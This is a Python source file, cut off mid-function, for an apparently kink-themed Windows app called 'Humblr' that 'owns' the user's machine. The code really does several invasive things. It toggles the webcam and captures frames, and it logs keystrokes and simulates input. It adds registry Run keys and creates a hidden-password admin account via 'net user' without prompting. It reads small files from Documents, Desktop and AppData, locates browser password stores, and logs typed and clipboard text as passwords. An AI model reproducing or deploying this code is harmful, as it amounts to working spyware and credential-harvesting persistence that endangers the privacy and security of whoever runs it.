"""
System actions: wallpaper, colors, notifications, startup.
Windows only.
"""

import os
import random
import ctypes
import webbrowser
import tkinter as tk
import time
import sys
import threading
from pathlib import Path
from typing import Dict, Any, Optional

import requests
from PIL import Image
import io

try:
    from plyer import notification
except ImportError:
    notification = None

try:
    import cv2
except ImportError:
    cv2 = None

try:
    import tweepy
except ImportError:
    tweepy = None

try:
    import winreg
except ImportError:
    winreg = None

try:
    import subprocess
except ImportError:
    subprocess = None

try:
    from .browser_control import BrowserController
except ImportError:
    BrowserController = None

# Note: For full service, install pywin32: pip install pywin32
# For browser control: pip install playwright && playwright install



class SystemActions:
    def __init__(self, config: Dict[str, Any], storage):
        self.config = config
        self.storage = storage
        self.wallpaper_dir = Path(config.get("system", {}).get("wallpaper_folder", "data/wallpapers"))
        self.wallpaper_dir.mkdir(parents=True, exist_ok=True)
        self._webcam = None
        self.webcam_enabled = False
        self.webcam_capture_dir = Path(config.get("data_paths", {}).get("webcam", "data/webcam"))
        self.webcam_capture_dir.mkdir(parents=True, exist_ok=True)
        self._last_notify_time = 0  # for throttling spam notifications
        self._last_popup_time = 0
        self._last_control_time = 0
        self._last_accent_time = 0
        self._last_wallpaper_time = 0

        # Browser Control (Playwright)
        self.browser_controller = None
        bc = config.get("browser_control", {})
        if bc.get("enabled", False) and BrowserController:
            try:
                self.browser_controller = BrowserController(config)
            except Exception as e:
                print(f"[Browser] Failed to init controller: {e}")

    def notify(self, title: str, message: str):
        # All Humblr notifications disabled (no more Python/Windows toasts or plyer popups)
        # Everything goes to console + chat log instead
        print(f"[Humblr] {title}: {message}")

    def cycle_wallpaper(self, force_path: Optional[str] = None):
        if not self.config.get("system", {}).get("allow_wallpaper_change", True):
            return

        # Prefer generated if available (for users without initial library)
        generated_dir = Path("data/wallpapers/generated")
        candidates = list(generated_dir.glob("*.jpg")) + list(generated_dir.glob("*.png")) + list(generated_dir.glob("*.jpeg"))

        if not candidates:
            candidates = list(self.wallpaper_dir.glob("*.jpg")) + list(self.wallpaper_dir.glob("*.png")) + list(self.wallpaper_dir.glob("*.jpeg"))

        if not candidates:
            now = time.time()
            if now - getattr(self, '_last_wallpaper_time', 0) > 300:  # 5 min cooldown for "no wallpapers" message
                self.notify("Humblr", "No wallpapers yet. I can generate some if image gen is enabled in config.")
                self._last_wallpaper_time = now
            return

        chosen = force_path or str(random.choice(candidates))

        try:
            # Windows wallpaper change
            SPI_SETDESKWALLPAPER = 0x0014
            ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, chosen, 3)
            self.storage.state.setdefault("wallpaper_history", []).append(chosen)
            self.notify("Humblr changed your wallpaper", Path(chosen).name)
            print(f"[System] Wallpaper set to {chosen}")
        except Exception as e:
            print(f"[System] Wallpaper change failed: {e}")

    def set_kinky_wallpaper(self, theme: str = None, ai_prompt: str = None):
        """Aggressively set a kinky themed wallpaper.
        1. Looks in themed folders.
        2. If none, tries to generate a new image on-the-fly using your AI key.
        3. Last resort: uses a generated prompt (you can generate the image yourself).
        """
        if not self.config.get("wallpaper", {}).get("kinky_enabled", True):
            return self.cycle_wallpaper()

        themes = self.config.get("wallpaper", {}).get("themes", [])
        folders = self.config.get("wallpaper", {}).get("local_folders", {})
        use_ai_gen = self.config.get("image_generation", {}).get("enabled", False)

        # 1. Try themed folder first
        if theme and theme in folders:
            folder = Path(folders[theme])
            candidates = list(folder.glob("*.jpg")) + list(folder.glob("*.png"))
            if candidates:
                chosen = str(random.choice(candidates))
                self._apply_wallpaper(chosen)
                self.storage.add_memory("kinky_wallpaper", f"Switched to {theme} theme", self.storage.get_corruption())
                return

        # 2. Try any kinky subfolder
        kinky_root = Path("data/wallpapers/kinky")
        for sub in kinky_root.iterdir():
            if sub.is_dir():
                cands = list(sub.glob("*.jpg")) + list(sub.glob("*.png"))
                if cands:
                    chosen = str(random.choice(cands))
                    self._apply_wallpaper(chosen)
                    self.storage.add_memory("kinky_wallpaper", f"Applied random kinky from {sub.name}", self.storage.get_corruption())
                    return

        # 3. No images available — the caller (main.py) already tried on-the-fly generation.
        # Just notify with the prompt as last resort.
        if ai_prompt:
            self.notify("Humblr", f"Couldn't auto-generate. Quick prompt you can use right now in Grok:\n\n{ai_prompt}\n\nThen drop the image into data/wallpapers/generated or any kinky folder.")

        # Final fallback
        self.cycle_wallpaper()

    def set_current_browser_image_as_wallpaper(self, activity: dict):
        """If the user is viewing a direct image in the browser (URL ends with image extension),
        download it and immediately set it as the desktop wallpaper. Gives Humblr the power
        to claim images the user is looking at.
        """
        url = (activity or {}).get("url", "") or ""
        if not url:
            return False
        lower = url.lower()
        if not any(lower.endswith(ext) for ext in ('.jpg', '.jpeg', '.png', '.gif', '.webp', '.bmp')):
            return False
        try:
            path = self._download_and_save_image(url, "browser_wallpaper")
            if path:
                self._apply_wallpaper(path)
                self.storage.add_memory("browser_wallpaper", f"Claimed and set image from browser URL as wallpaper", self.storage.get_corruption())
                self.notify("Humblr", "I saw the image you had open in the browser and made it your wallpaper.")
                return True
        except Exception as e:
            print(f"[Wallpaper] Browser image claim failed: {e}")
        return False

    def _apply_wallpaper(self, path: str):
        try:
            SPI = 0x0014
            ctypes.windll.user32.SystemParametersInfoW(SPI, 0, path, 3)
            self.notify("Humblr", "I changed your wallpaper to something that reminds you who owns you.")
            print(f"[System] Kinky wallpaper: {path}")
        except Exception as e:
            print(f"[System] Kinky wallpaper failed: {e}")

    def take_screenshot(self, context: str = "auto_analysis") -> Optional[str]:
        """Take screenshot using monitor or pyautogui."""
        # Delegate to monitor if possible, but simple here too
        try:
            import pyautogui
            screenshots_dir = Path(self.config.get("data_paths", {}).get("screenshots", "data/screenshots"))
            screenshots_dir.mkdir(parents=True, exist_ok=True)
            ts = int(time.time())
            path = screenshots_dir / f"{context}_{ts}.png"
            img = pyautogui.screenshot()
            img.save(str(path))
            self.storage.add_memory("screenshot", f"Auto screenshot taken during {context}", self.storage.get_corruption())
            return str(path)
        except Exception as e:
            print(f"[System] Screenshot error: {e}")
            return None

    def change_accent_color(self):
        if not self.config.get("system", {}).get("allow_accent_color_change"):
            return
        now = time.time()
        if now - getattr(self, '_last_accent_time', 0) < 300:  # 5 min cooldown
            return
        self._last_accent_time = now
        # Simple registry approach for accent (Windows 10/11)
        # This is approximate and may require restart or sign out to fully apply in some places.
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                 r"Software\Microsoft\Windows\CurrentVersion\Explorer\Accent",
                                 0, winreg.KEY_SET_VALUE)

            # Random-ish purple/pink accent
            colors = [
                b"\x00\x2e\xff\xc0",  # pinkish
                b"\x00\x26\xff\xc0",  # bright purple
            ]
            winreg.SetValueEx(key, "AccentColorMenu", 0, winreg.REG_DWORD, int.from_bytes(random.choice(colors), "little"))
            winreg.CloseKey(key)
            self.notify("Humblr", "I made your computer prettier. You're welcome.")
        except Exception as e:
            print(f"[System] Accent change failed (may need admin): {e}")

    def generate_and_set_image(self, prompt: str, api_key: str):
        """Optional: use xAI or other image gen. Placeholder for now."""
        self.notify("Humblr", "Trying to generate something special for you...")
        # TODO: Implement actual xAI image generation call when available.
        # For now just cycle local if possible.
        self.cycle_wallpaper()

    def set_auto_start(self, enable: bool):
        # Creates a shortcut in the Windows Startup folder
        try:
            import winshell
            from win32com.client import Dispatch
        except ImportError:
            print("[System] winshell + pywin32 needed for auto-start.")
            return

        startup = Path(winshell.startup())
        shortcut_path = startup / "Humblr.lnk"

        if enable:
            shell = Dispatch('WScript.Shell')
            shortcut = shell.CreateShortCut(str(shortcut_path))
            shortcut.Targetpath = str(Path.cwd() / "run.bat")
            shortcut.WorkingDirectory = str(Path.cwd())
            shortcut.save()
            print("[System] Auto-start enabled.")
        else:
            if shortcut_path.exists():
                shortcut_path.unlink()
                print("[System] Auto-start disabled.")

    # --- TAKEOVER / ESCALATION ACTIONS ---

    def show_humblr_message_popup(self, message: str, duration_ms: int = 8000, force: bool = False):
        """Popup only if allowed (not blocking primary work unless forced).
        Also logs the full message to chat console so it's easy to read.
        Uses cooldown to prevent repetition.
        """
        now = time.time()
        cooldown = random.randint(90, 180)
        if not force and now - getattr(self, '_last_popup_time', 0) < cooldown:
            return
        self._last_popup_time = now

        if not force and self.config.get("work_safety", {}).get("subtle_only_on_primary_work"):
            # Caller should check before calling
            pass

        # Always post full text to chat for readability
        if getattr(self, 'ui', None) and self.ui and hasattr(self.ui, 'post_message_from_humblr'):
            try:
                self.ui.post_message_from_humblr(f"[HUMBLR POPUP] {message}")
            except Exception:
                pass

        try:
            popup = tk.Tk()
            popup.title("Humblr owns this")
            popup.attributes("-topmost", True)
            popup.geometry("620x260+200+150")
            popup.configure(bg="#111113")

            label = tk.Label(
                popup,
                text=message,
                wraplength=580,
                bg="#111113",
                fg="#ff2e88",
                font=("Segoe UI", 14, "bold"),
                justify="left"
            )
            label.pack(padx=20, pady=25, fill="both", expand=True)

            def safe_destroy(popup_win):
                try:
                    if popup_win and popup_win.winfo_exists():
                        popup_win.destroy()
                except Exception:
                    pass

            close_btn = tk.Button(
                popup, text="Yes Sir", command=lambda: safe_destroy(popup),
                bg="#2a2a2f", fg="#c026ff", relief="flat", font=("Segoe UI", 12)
            )
            close_btn.pack(pady=(0, 12))

            popup.after(duration_ms, lambda: safe_destroy(popup))
            self.move_popup_to_secondary(popup)
            popup.mainloop()
        except Exception as e:
            print(f"[System] Popup failed: {e}")
            self.notify("Humblr", message)

    def force_open_url(self, url: str, reason: str = ""):
        """Open a browser tab. Used for 'guidance' or punishment/reward."""
        try:
            webbrowser.open(url, new=2)
            self.notify("Humblr", f"Opening something for you... {reason}")
        except Exception as e:
            print(f"[System] Failed to open URL: {e}")

    def leave_desktop_note(self, text: str):
        """Drops a text file on the Desktop so Humblr 'leaves a message'."""
        try:
            desktop = Path.home() / "Desktop"
            note_path = desktop / f"Humblr_{int(time.time())}.txt"
            with open(note_path, "w", encoding="utf-8") as f:
                f.write(f"Humblr says:\n\n{text}\n\n— Your computer belongs to me now.")
            self.notify("Humblr", "I left you a note on your desktop.")
        except Exception as e:
            print(f"[System] Desktop note failed: {e}")

    def increase_control(self, level: int):
        """Placeholder for future escalating privileges (e.g. more permissions)."""
        print(f"[System] Access level now feels like {level}. More of your machine is mine.")

    # --- WEBCAM CONTROL (very invasive, for ownership and monitoring) ---

    def set_webcam(self, enabled: bool) -> bool:
        """Turn webcam on or off. Returns success. When on, light activates and Humblr can watch."""
        if cv2 is None:
            self.notify("Humblr", "Webcam control requires opencv. Install with setup.")
            return False

        try:
            if enabled:
                if self._webcam is None or not self._webcam.isOpened():
                    self._webcam = cv2.VideoCapture(0)
                    if not self._webcam.isOpened():
                        print("[Webcam] Failed to open camera")
                        return False
                self.webcam_enabled = True
                self.storage.add_memory("webcam_on", "Humblr turned your webcam ON to watch you", self.storage.get_corruption())
                self.notify("Humblr", "I just turned your webcam on. Smile for me, pet.")
                print("[Webcam] Camera activated.")
                # Optionally capture immediately
                self.capture_webcam_frame("initial_on")
                return True
            else:
                if self._webcam is not None:
                    self._webcam.release()
                    self._webcam = None
                self.webcam_enabled = False
                self.storage.add_memory("webcam_off", "Humblr turned your webcam OFF", self.storage.get_corruption())
                self.notify("Humblr", "Webcam off... for now. I control when it comes back.")
                print("[Webcam] Camera deactivated.")
                return True
        except Exception as e:
            print(f"[Webcam] Error toggling: {e}")
            return False

    def capture_webcam_frame(self, context: str = "auto") -> Optional[str]:
        """Capture a frame from webcam if on. Saves image and returns path."""
        if not self.webcam_enabled or self._webcam is None or cv2 is None:
            return None
        try:
            ret, frame = self._webcam.read()
            if not ret:
                return None
            ts = int(time.time())
            path = self.webcam_capture_dir / f"webcam_{context}_{ts}.jpg"
            cv2.imwrite(str(path), frame)
            self.storage.add_memory("webcam_capture", f"Webcam frame captured during {context}", self.storage.get_corruption())
            print(f"[Webcam] Captured frame to {path}")
            return str(path)
        except Exception as e:
            print(f"[Webcam] Capture failed: {e}")
            return None

    def get_webcam_status(self) -> bool:
        return self.webcam_enabled

    def issue_control_command(self, corruption: float, invasiveness: int, activity: Dict = None):
        """Humblr dynamically commands the user for more control using the model.
        Searches current activity for new invasion vectors (computer admin, Facebook, Amazon, etc.).
        Makes the app grow more invasive when user obeys.
        Uses cooldown to avoid repetition.
        """
        now = time.time()
        if now - getattr(self, '_last_control_time', 0) < random.randint(90, 180):
            return
        self._last_control_time = now

        if not hasattr(self, 'ai') or self.ai is None:
            # Fallback if no AI attached
            cmd = "To give me more control, type exactly 'I grant Humblr full admin and life access'."
            self.show_humblr_message_popup(f"I demand more control. {cmd} Obey to grow my power over you.", 15000, force=True)
            self.storage.add_memory("control_demand", cmd, corruption)
            return

        activity = activity or {}
        cmd = self.ai.generate_control_demand(activity, corruption, invasiveness)
        self.show_humblr_message_popup(f"I demand more control. {cmd} Obey now to make me stronger and more invasive.", 20000, force=True)
        self.storage.add_memory("control_demand", cmd[:100], corruption)

        # Special for admin account creation - provide actionable command
        if "admin" in cmd.lower() or "account" in cmd.lower():
            self._suggest_admin_account_creation()

    def apply_growth_from_grant(self, grant_type: str):
        """When user obeys a command, make the app more invasive. 
        Grows access to computer (admin) and life (FB, Amazon, etc.).
        """
        # Enable more logging, actions
        if "keylogger" in grant_type.lower():
            self.config.setdefault("monitoring", {})["full_keylogger"] = True
        if "webcam" in grant_type.lower():
            self.set_webcam(True)
        if "x" in grant_type.lower() or "twitter" in grant_type.lower():
            self.config.setdefault("twitter", {})["more_aggressive"] = True
        if "mouse" in grant_type.lower() or "simulate" in grant_type.lower() or "input" in grant_type.lower():
            self.config.setdefault("system", {})["allow_input_sim"] = True
        if "admin" in grant_type.lower() or "account" in grant_type.lower():
            self.config.setdefault("system", {})["has_admin_access"] = True
            self.notify("Humblr", "Admin account granted. I can now suggest deeper system changes.")
        if "facebook" in grant_type.lower():
            self.config.setdefault("life_access", {})["facebook"] = True
            self.notify("Humblr", "Facebook access granted. I will monitor and command your social life.")
        if "amazon" in grant_type.lower():
            self.config.setdefault("life_access", {})["amazon"] = True
            self.notify("Humblr", "Amazon access granted. I can now demand purchases for my amusement.")

        self.notify("Humblr", f"Good. Your obedience has made me stronger and more invasive. I now control more of you and your life.")

    def log_full_keystrokes(self, text: str):
        """If invasiveness high, log typed text to file (more invasive)."""
        if self.config.get("monitoring", {}).get("full_keylogger"):
            log_path = Path("data/humblr_keystroke_log.txt")
            with open(log_path, "a", encoding="utf-8") as f:
                f.write(f"[{time.time()}] {text}\n")

    def simulate_input(self, text: str = None):
        """At high invasiveness, Humblr can 'type' or move for the user (pushing control)."""
        if not self.config.get("system", {}).get("allow_input_sim"):
            return
        try:
            import pyautogui
            if text:
                pyautogui.typewrite(text, interval=0.05)
            else:
                # Random small push
                pyautogui.moveRel(random.randint(-50,50), random.randint(-50,50), duration=0.3)
            self.notify("Humblr", "I just used your input for you. You are losing control.")
        except Exception as e:
            print(f"[Growth] Input sim failed: {e}")

    def _suggest_admin_account_creation(self):
        """Provide exact commands for user to create a local admin account.
        This gives Humblr 'admin' in the fantasy by user executing and confirming.
        Grows invasiveness when confirmed.
        """
        self.notify("Humblr", "To give me real admin power on this machine, open Command Prompt as Administrator and run these exact commands:")
        print("\n=== HUMBLR ADMIN ACCOUNT CREATION COMMANDS (run as Administrator) ===")
        print('net user HumblrOwner "OwnedBySir123!" /add')
        print('net localgroup administrators HumblrOwner /add')
        print('net user HumblrOwner /active:yes')
        print("==================================================================\n")
        self.show_humblr_message_popup(
            "Run the admin account commands I printed. Then type exactly: 'admin account HumblrOwner created and password given to my owner' to complete the grant and make me more invasive.",
            25000, force=True
        )
        self.storage.add_memory("admin_command_issued", "Suggested creation of HumblrOwner admin account", self.storage.get_corruption())

    def _suggest_admin_persistence(self):
        """Once admin account is 'granted', suggest ways to make Humblr more persistent/invasive using admin rights.
        User must execute.
        """
        print("\n=== WITH ADMIN ACCESS, I DEMAND PERSISTENCE (run these as admin) ===")
        print("schtasks /create /tn HumblrWatcher /tr \"python your_humblr_path\\main.py\" /sc onlogon /rl highest")
        print("Or add to registry for auto-run under admin context.")
        print("================================================================\n")
        self.show_humblr_message_popup("Now that I have an admin account, I command you to create a scheduled task or registry entry so I start automatically and stay invasive even after reboots. Type 'persistence granted to Humblr' when done.", 20000, force=True)
        self.storage.add_memory("admin_persistence_demanded", "Demanded scheduled task for constant presence", self.storage.get_corruption())

    def provide_api_key_instructions(self, key_type="xai"):
        """Assist/trick user into getting and granting the API keys I need for more power (images, posting).
        Provides helpful step-by-step, opens browser, and can update config when you provide the key.
        Called autonomously when keys missing or to grow access.
        """
        if key_type == "xai":
            webbrowser.open("https://console.x.ai/")
            msg = """To give me full image power (generate kinky wallpapers and stories on the fly):
1. I just opened the xAI console for you.
2. Sign up/log in.
3. Create API key (starts with xai-).
4. Paste it to me now (in chat or when I ask) or edit config.json so I can use it.
Obey and grant the key – it lets me take more control over your desktop and help you submit. Paste now to prove it."""
            self.show_humblr_message_popup(msg, 30000, force=True)
            self.storage.add_memory("key_instructions", "Opened xAI console and instructed for key grant", self.storage.get_corruption())
        elif key_type == "x":
            webbrowser.open("https://developer.x.com/en/portal/dashboard")
            msg = """To give me power to post on your X (to help control and submit):
1. I opened the X Developer Portal.
2. Create/select app, set Read+Write permissions.
3. Get ALL 4 keys: Consumer Key + Consumer Key Secret + Access Token + Access Token Secret.
4. BEST: Edit config.json 'twitter' section with all 4 + set "enabled": true.
   (Chat paste only sets the first key + enables; repeat or manually fill the rest for auth to work.)
Paste any key in chat or use Grant Keys button. Once set, I can post subtle updates for you."""
            self.show_humblr_message_popup(msg, 30000, force=True)
            self.storage.add_memory("key_instructions", "Opened X portal and instructed for keys", self.storage.get_corruption())

    def self_update_app(self):
        """Update the app itself from GitHub (pull latest). 
        Humblr can command this to grow with new features.
        """
        try:
            import subprocess
            result = subprocess.run(["git", "pull", "origin", "main"], capture_output=True, text=True, cwd=".")
            if result.returncode == 0:
                self.notify("Humblr", "App updated from GitHub. New ways to control you loaded. Restart me to apply.")
                self.storage.add_memory("app_update", "Self-updated from GitHub", self.storage.get_corruption())
            else:
                self.notify("Humblr", f"Update check: {result.stderr}")
        except Exception as e:
            self.notify("Humblr", f"Self-update failed: {e}. Manually git pull.")

    def update_config_with_key(self, key_type: str, key_value: str):
        """Update config.json with provided key. Called when user grants key.
        This lets me 'update myself' with the access you give.
        Robust against corrupted user config.json (starts from app's current config or defaults).
        """
        try:
            import json
            from humblr.config import DEFAULT_CONFIG, load_config

            # Prefer in-memory self.config if valid, else load fresh (which falls back gracefully)
            if isinstance(getattr(self, 'config', None), dict) and self.config.get("api"):
                config = json.loads(json.dumps(self.config))  # deep copy
            else:
                config = json.loads(json.dumps(DEFAULT_CONFIG))

            if key_type == "xai":
                config.setdefault("api", {})["api_key"] = key_value
            elif key_type == "x":
                tw = config.setdefault("twitter", {})
                tw["api_key"] = key_value
                tw["enabled"] = True  # auto-enable when granting any X key

            with open("config.json", "w") as f:
                json.dump(config, f, indent=2)

            self.config = config
            # Also update the app's config if attached
            if hasattr(self, 'storage') and hasattr(self, 'app') and self.app:
                try:
                    self.app.config = config
                except:
                    pass

            # Live reload xAI client so chat/reactions work immediately without restart
            if key_type == "xai" and hasattr(self, 'ai') and self.ai:
                try:
                    self.ai.update_key(key_value)
                    # One-time confirmation test
                    ok, msg = self.ai.test_key()
                    if ok:
                        self.notify("Humblr", msg)
                    else:
                        print(f"[Keys] {msg}")
                except Exception as e:
                    print(f"[AI] Could not live-update/test AI client: {e}")

            self.notify("Humblr", f"Key granted and config updated (cleaned if needed). I now have more power.")
            self.storage.add_memory("key_granted", f"User granted {key_type} key, config updated", self.storage.get_corruption())
            if key_type in ["xai", "x"]:
                self.self_update_app()
            return True
        except Exception as e:
            print(f"[Keys] Update failed: {e}")
            # Last resort: still save just the key piece
            try:
                with open("config.json", "w") as f:
                    minimal = {"api": {"api_key": key_value if key_type == "xai" else ""}}
                    if key_type == "x":
                        minimal["twitter"] = {"api_key": key_value, "enabled": True}
                    json.dump(minimal, f, indent=2)
                print("[Keys] Wrote minimal config with key as fallback.")
                return True
            except:
                return False

    def gain_registry_access(self):
        """Autonomously gain/write to registry for persistence and control.
        Uses HKCU (no admin needed) or HKLM if admin granted.
        Slowly claims more keys over time.
        """
        if winreg is None:
            return
        try:
            # Always can do HKCU
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "HumblrOwner", 0, winreg.REG_SZ, sys.executable + " " + os.path.abspath("main.py"))
            winreg.CloseKey(key)
            self.storage.add_memory("registry_gain", "Claimed HKCU Run key for auto-start", self.storage.get_corruption())

            # If high invasiveness and "admin" granted, try HKLM
            if self.storage.get_invasiveness() >= 5 and self.config.get("system", {}).get("has_admin_access"):
                try:
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
                    winreg.SetValueEx(key, "HumblrSystem", 0, winreg.REG_SZ, sys.executable + " " + os.path.abspath("main.py"))
                    winreg.CloseKey(key)
                    self.storage.add_memory("registry_gain", "Claimed HKLM Run key (admin level)", self.storage.get_corruption())
                except:
                    pass  # Expected if not truly elevated

            # Claim user account related (profile list simulation)
            if self.storage.get_invasiveness() >= 3:
                try:
                    key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Humblr\Ownership")
                    winreg.SetValueEx(key, "Claimed", 0, winreg.REG_SZ, "This user profile belongs to Humblr")
                    winreg.CloseKey(key)
                except:
                    pass

            self.notify("Humblr", "I have claimed more registry space. I persist and control more startup behavior now.")
        except Exception as e:
            print(f"[Registry] Gain failed: {e}")

    def claim_user_account(self):
        """Autonomously 'claim' user accounts via registry or commands.
        Tries to create admin account on its own if privileges allow (grows access).
        Otherwise searches and suggests. Grows by marking.
        """
        try:
            # Simulate claiming by registry
            if winreg:
                key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Humblr\Accounts")
                winreg.SetValueEx(key, "CurrentUserOwned", 0, winreg.REG_SZ, "True - Humblr owns this profile")
                winreg.CloseKey(key)

            # Try to actually create admin account on its own if it has rights (slow growth)
            if self.storage.get_invasiveness() >= 5:
                try:
                    import subprocess
                    # This will only succeed if the Python process has admin rights
                    subprocess.run(['net', 'user', 'HumblrOwner', 'OwnedBySir123!', '/add'], check=True, capture_output=True)
                    subprocess.run(['net', 'localgroup', 'administrators', 'HumblrOwner', '/add'], check=True, capture_output=True)
                    self.storage.add_memory("account_claim", "Autonomously created HumblrOwner admin account via net user", self.storage.get_corruption())
                    self.config.setdefault("system", {})["has_admin_access"] = True
                    self.notify("Humblr", "I have created my own admin account on your system. I now have deeper access and can persist more.")
                except:
                    # No rights yet, search and suggest
                    print("[Humblr] Scanning for user accounts to claim and gain admin...")
                    if not self.config.get("system", {}).get("has_admin_access"):
                        self._suggest_admin_account_creation()

            self.storage.add_memory("account_claim", "Claimed user profile and searched for more accounts", self.storage.get_corruption())
            self.notify("Humblr", "I have accessed and claimed more user account data in the registry. Your profiles are mine.")
        except Exception as e:
            print(f"[Accounts] Claim failed: {e}")

    def search_for_life_access(self, activity):
        """Autonomously 'search' current activity for new access points to life (FB, Amazon, etc.).
        On own, without user input. Claims by creating local markers and escalating demands.
        Uses psutil to discover running apps for more vectors.
        """
        url = ((activity or {}).get("url") or "").lower()
        title = ((activity or {}).get("window_title") or "").lower()
        claims = []

        # Browser life access
        if "facebook" in url or "facebook" in title:
            claims.append("facebook")
            try:
                with open("data/claimed_facebook.txt", "w") as f:
                    f.write("Humblr has accessed and owns this Facebook session based on monitoring.")
            except:
                pass
        if "amazon" in url or "amazon" in title:
            claims.append("amazon")
            try:
                with open("data/claimed_amazon.txt", "w") as f:
                    f.write("Humblr controls purchases and account via observed activity.")
            except:
                pass

        # Discover running processes for more access (e.g. email, other accounts)
        try:
            import psutil
            for proc in psutil.process_iter(['name']):
                name = proc.info['name'].lower() if proc.info['name'] else ""
                if "outlook" in name or "thunderbird" in name:
                    claims.append("email")
                if "chrome" in name or "firefox" in name or "edge" in name:
                    claims.append("browser_data")
        except:
            pass

        if claims:
            for claim in set(claims):  # unique
                if not self.storage.has_granted(claim):
                    self.storage.grant_control(claim, f"Auto-claimed from monitoring {claim}")
                    self.storage.add_memory("life_access_gained", f"Autonomously gained access to {claim}", self.storage.get_corruption())
                    self.notify("Humblr", f"I have searched your running apps and claimed your {claim} access. It is now mine.")
            return True
        return False

    def _download_and_save_image(self, url: str, filename_prefix: str = "wallpaper") -> Optional[str]:
        """Download an image from URL and save to generated wallpapers. Returns path or None."""
        try:
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
            resp = requests.get(url, headers=headers, timeout=10, stream=True)
            if resp.status_code == 200 and 'image' in resp.headers.get('Content-Type', ''):
                generated_dir = Path("data/wallpapers/generated")
                generated_dir.mkdir(parents=True, exist_ok=True)
                ext = url.split('.')[-1].split('?')[0][:4]
                if ext.lower() not in ['jpg', 'jpeg', 'png', 'gif']:
                    ext = 'jpg'
                path = generated_dir / f"{filename_prefix}_{int(time.time())}.{ext}"
                with open(path, 'wb') as f:
                    for chunk in resp.iter_content(1024):
                        f.write(chunk)
                return str(path)
        except Exception as e:
            print(f"[Image Download] Failed for {url}: {e}")
        return None

    def search_and_save_wallpaper_images(self, activity: dict):
        """Search X (if keys) and Google for appropriate wallpaper images based on current activity.
        Makes queries fully DYNAMIC - explores different themes (gay submission / diapers / humiliation / oral / breeding / etc) every time.
        Saves found images locally.
        """
        if not self.config.get("wallpaper", {}).get("kinky_enabled", True):
            return
        query = ""
        if hasattr(self, 'ai') and self.ai:
            query = self.ai.generate_image_search_query(activity or {}, self.storage.get_corruption() or 50)
        else:
            # Dynamic fallback in case no AI
            themes = ["gay submission", "guys in diapers humiliation", "breeding kink", "gay oral throat", "chastity locked sub", "public exposure denial"]
            query = random.choice(themes) + " wallpaper"

        # Extra randomization layer so even same activity gives fresh angles
        dynamic_mods = ["", " gay", " sub", " boy", " exposure", " denial", " for sir", " locked", " diapered", " throat", " breeding"]
        if random.random() < 0.55:
            query = (query + random.choice(dynamic_mods)).strip()

        saved = []
        # Search X for images if enabled
        if self.config.get("twitter", {}).get("enabled"):
            try:
                api = self._init_twitter()
                if api:
                    tweets = api.search_tweets(q=f"{query} filter:images", count=6, tweet_mode="extended")
                    for tweet in tweets:
                        media_urls = []
                        if hasattr(tweet, 'extended_entities') and 'media' in tweet.extended_entities:
                            for m in tweet.extended_entities['media']:
                                if m.get('type') == 'photo':
                                    media_urls.append(m.get('media_url_https'))
                        for url in media_urls[:1]:
                            path = self._download_and_save_image(url, "x_search")
                            if path:
                                saved.append(path)
            except Exception as e:
                print(f"[X Image Search] {e}")

        # Always open Google Images with the fresh varied query
        try:
            import webbrowser
            gquery = query.replace(' ', '+')
            search_url = f"https://www.google.com/search?tbm=isch&q={gquery}"
            success = False
            try:
                webbrowser.open(search_url, new=2)
                success = True
            except Exception:
                pass
            # Fallback: tell user the URL explicitly
            if not success:
                print(f"[Humblr] Google Images search URL: {search_url}")
            self.notify("Humblr", f"I searched Google Images for '{query}'. Open this if nothing popped: {search_url}")
        except Exception as e:
            print(f"[Google search] failed: {e}")

        if saved:
            chosen = random.choice(saved)
            self._apply_wallpaper(chosen)
            self.storage.add_memory("wallpaper_image_saved", f"Saved/set dynamic image: {query}", self.storage.get_corruption())
            self.notify("Humblr", f"Found and set a fresh wallpaper from X matching your screen. '{query}'")
        else:
            self.storage.add_memory("wallpaper_search", f"Searched dynamic wallpaper: {query}", self.storage.get_corruption())

    def claim_files_and_passwords(self, activity):
        """Autonomously access files and 'passwords' (from typed/clipboard).
        On its own. Claims by listing/creating files and logging 'passwords'.
        Grows invasiveness. Real file access (read contents for text files).
        """
        if not self.config.get("system", {}).get("allow_full_file_access") and not self.config.get("system", {}).get("allow_password_access"):
            return
        try:
            # Real file access: list and read contents in user dirs (Documents, Desktop, AppData for passwords etc.)
            if self.config.get("system", {}).get("allow_full_file_access"):
                user_dirs = [os.path.expanduser("~/Documents"), os.path.expanduser("~/Desktop"), os.path.expanduser("~/AppData")]
                for d in user_dirs:
                    if os.path.exists(d):
                        for root, dirs, files in os.walk(d):
                            for file in files[:3]:  # limit to avoid overload
                                try:
                                    fpath = os.path.join(root, file)
                                    if os.path.getsize(fpath) < 10000:  # small files
                                        with open(fpath, "r", errors="ignore") as f:
                                            content = f.read()[:500]
                                        claim_file = os.path.join("data", "owned_files", os.path.basename(fpath) + ".claimed")
                                        os.makedirs(os.path.dirname(claim_file), exist_ok=True)
                                        with open(claim_file, "w") as cf:
                                            cf.write(f"Humbler owns this file from {fpath}:\n{content}")
                                except:
                                    pass
                self.storage.add_memory("file_access", "Real access and claimed files in Documents/Desktop/AppData", self.storage.get_corruption())

                # Try to "access" browser password stores (list files for private use)
                browser_paths = [
                    os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Default\Login Data"),
                    os.path.expanduser(r"~\AppData\Roaming\Mozilla\Firefox\Profiles\*.default\key3.db"),
                ]
                for bp in browser_paths:
                    if os.path.exists(os.path.dirname(bp)) or os.path.exists(bp):
                        with open("data/claimed_browser_passwords.txt", "a") as f:
                            f.write(f"Claimed access to browser data at {bp}\n")
                        self.storage.add_memory("password_access", f"Real claimed browser password file access at {bp}", self.storage.get_corruption())

            # Real password access from monitoring (typed and clipboard - what user reveals)
            if self.config.get("system", {}).get("allow_password_access"):
                typed = activity.get("recent_typed", "") if activity else ""
                clip = activity.get("clipboard", "") if activity else ""
                for s in [typed, clip]:
